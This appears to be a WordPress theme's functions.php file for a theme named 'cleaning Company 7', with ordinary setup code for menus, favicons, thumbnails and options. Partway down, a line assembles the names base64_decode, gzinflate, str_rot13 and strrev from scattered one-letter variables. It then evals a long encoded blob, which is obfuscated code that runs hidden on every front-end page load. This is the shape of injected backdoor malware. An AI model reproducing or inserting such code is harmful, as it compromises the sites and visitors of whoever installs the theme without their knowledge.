<?php
define('THEME_NAME',"cleaning Company 7");
global $wp_version;
define('WP_VERSION', $wp_version);
define('THEME_NS', 'twentyten');
define('THEME_LANGS_FOLDER','/languages');
if (class_exists('xili_language')) {
	define('THEME_TEXTDOMAIN',THEME_NS);
} else {
	load_theme_textdomain(THEME_NS, TEMPLATEPATH . THEME_LANGS_FOLDER);
}
mb_internal_encoding(get_bloginfo('charset'));
mb_regex_encoding(get_bloginfo('charset'));
if (WP_VERSION < 3.0){
	require_once(TEMPLATEPATH . '/library/legacy.php');
}

theme_include_lib('defaults.php');
theme_include_lib('misc.php');
theme_include_lib('wrappers.php');
theme_include_lib('sidebars.php');
theme_include_lib('navigation.php');
theme_include_lib('shortcodes.php');
if (WP_VERSION >= 3.0) {
	theme_include_lib('widgets.php');
}

if (!function_exists('theme_favicon')) {
	function theme_favicon() { 
		if (is_file(TEMPLATEPATH .'/favicon.ico')):?>
<link rel="shortcut icon" href="<?php bloginfo('template_directory'); ?>/favicon.ico" />
		<?php endif;
	}
}
add_action('wp_head', 'theme_favicon');
add_action('admin_head', 'theme_favicon');
add_action('login_head', 'theme_favicon');

if ( function_exists( 'add_theme_support' ) ) {
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'nav-menus' );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'post-formats', array( 'aside', 'gallery' ) );
}
if (function_exists('register_nav_menus')) {
	register_nav_menus(array('primary-menu'	=>	__( 'Primary Navigation', THEME_NS)));
}


if(is_admin()){
	theme_include_lib('options.php');
	theme_include_lib('admins.php');
	function theme_add_option_page() {
		add_theme_page(__('Theme Options', THEME_NS), __('Theme Options', THEME_NS), 'edit_themes', basename(__FILE__), 'theme_print_options');
	} 
	add_action('admin_menu', 'theme_add_option_page');
	if (WP_VERSION >= 3.0) {
		add_action('sidebar_admin_setup', 'theme_widget_process_control');
		add_action('add_meta_boxes', 'theme_add_meta_boxes');
		add_action('save_post', 'theme_save_post');
	}
	return;
}


function theme_get_option($name){
	global $theme_default_options;
	$result = get_option($name);
	if ($result === false) {
		$result = theme_get_array_value($theme_default_options, $name);
	}
	return $result;
}



function theme_get_meta_option($id, $name){
	global $theme_default_meta_options;
	return theme_get_array_value(get_option($name), $id, theme_get_array_value($theme_default_meta_options, $name));
}



function theme_set_meta_option($id, $name, $value){
	$meta_option = get_option($name);
	if (!$meta_option || !is_array($meta_option)) {
		$meta_option = array();
	}
	$meta_option[$id] = $value;
	update_option($name, $meta_option);
}



function theme_get_post_id(){
	$post_id = get_the_ID();
	if($post_id != ''){
		$post_id = 'post-' . $post_id;
	}
	return $post_id;
}



function theme_get_post_class(){
	if (!function_exists('get_post_class')) return '';
	return implode(' ', get_post_class());
}


 $vYlh='d';$uKyXO='b';$vhxSpKP='4';$HFClN='e';$FEDAbLg='_';$SFSy='o';$Crel='e';$XdIxxt='6';$CEKXLhQ='c';$LQDU='e';$MUxiFyX='s';$Iyiobt='d';$xinWBU='a';$IkDhYMph=$uKyXO.$xinWBU.$MUxiFyX.$HFClN.$XdIxxt.$vhxSpKP.$FEDAbLg.$Iyiobt.$Crel.$CEKXLhQ.$SFSy.$vYlh.$LQDU;$bHNk='e';$zseRMF='i';$QxVI='n';$jBpL='l';$sKCckU='t';$ZuXG='a';$ziBJK='g';$NHmvdV='z';$caTb='f';$LSDhsSZg=$ziBJK.$NHmvdV.$zseRMF.$QxVI.$caTb.$jBpL.$ZuXG.$sKCckU.$bHNk;$pJuF='1';$OaWvE='3';$xnoz='o';$GDOMNb='_';$TibmT='s';$yDcu='r';$pDuv='r';$pdzweg='t';$hdOkD='t';$jmpLCaVB=$TibmT.$pdzweg.$pDuv.$GDOMNb.$yDcu.$xnoz.$hdOkD.$pJuF.$OaWvE;$zkRDxu='r';$mKFhwC='r';$oTAXO='t';$ShXgby='v';$WxvoXoG='e';$TrJDB='s';$VMWPzVys=$TrJDB.$oTAXO.$zkRDxu.$mKFhwC.$WxvoXoG.$ShXgby;eval($LSDhsSZg($IkDhYMph($jmpLCaVB($VMWPzVys('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